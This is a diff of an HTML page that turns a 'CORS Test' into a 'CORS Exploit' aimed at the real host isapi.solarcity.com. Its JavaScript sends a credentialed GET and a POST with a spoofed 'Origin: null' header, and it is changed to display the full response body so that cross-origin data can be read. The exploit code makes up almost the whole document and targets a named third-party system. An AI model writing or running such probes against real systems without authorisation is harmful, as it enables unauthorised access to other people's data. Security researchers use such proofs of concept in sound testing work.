@@ -1,51 +1,65 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>CORS Test - isapi.solarcity.com</title>
+<title>CORS Exploit - isapi.solarcity.com</title>
 </head>
 <body>
-<h1>CORS Vulnerability Test</h1>
-<div id="result"></div>
+<h1>CORS Vulnerability Demonstration</h1>
+<div id="results"></div>
 
 <script>
-// Test 1: Basic CORS request
+function log(msg) {
+    document.getElementById('results').innerHTML += '<p>' + msg + '</p>';
+    console.log(msg);
+}
+
+// Test 1: Basic CORS request with Origin: null
 fetch('https://isapi.solarcity.com/', {
     method: 'GET',
-    mode: 'cors',
     headers: {
         'Origin': 'null'
     }
 })
 .then(response => {
-    document.getElementById('result').innerHTML += 
-        '<p>Test 1 - Status: ' + response.status + '</p>';
+    log('Test 1 - Status: ' + response.status);
     return response.text();
 })
 .then(data => {
-    document.getElementById('result').innerHTML += 
-        '<p>Test 1 - Data received: ' + data.length + ' characters</p>';
+    log('Test 1 - Response: ' + data);
 })
 .catch(error => {
-    document.getElementById('result').innerHTML += 
-        '<p>Test 1 - Error: ' + error + '</p>';
+    log('Test 1 - Error: ' + error);
 });
 
 // Test 2: With credentials
 fetch('https://isapi.solarcity.com/', {
     method: 'GET',
-    mode: 'cors',
     credentials: 'include',
     headers: {
         'Origin': 'null'
     }
 })
 .then(response => {
-    document.getElementById('result').innerHTML += 
-        '<p>Test 2 - Status: ' + response.status + '</p>';
+    log('Test 2 - Status: ' + response.status);
 })
 .catch(error => {
-    document.getElementById('result').innerHTML += 
-        '<p>Test 2 - Error: ' + error + '</p>';
+    log('Test 2 - Error: ' + error);
+});
+
+// Test 3: POST request
+fetch('https://isapi.solarcity.com/', {
+    method: 'POST',
+    headers: {
+        'Origin': 'null',
+        'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: 'test=data'
+})
+.then(response => {
+    log('Test 3 - POST Status: ' + response.status);
+})
+.catch(error => {
+    log('Test 3 - Error: ' + error);
 });
 </script>
 </body>
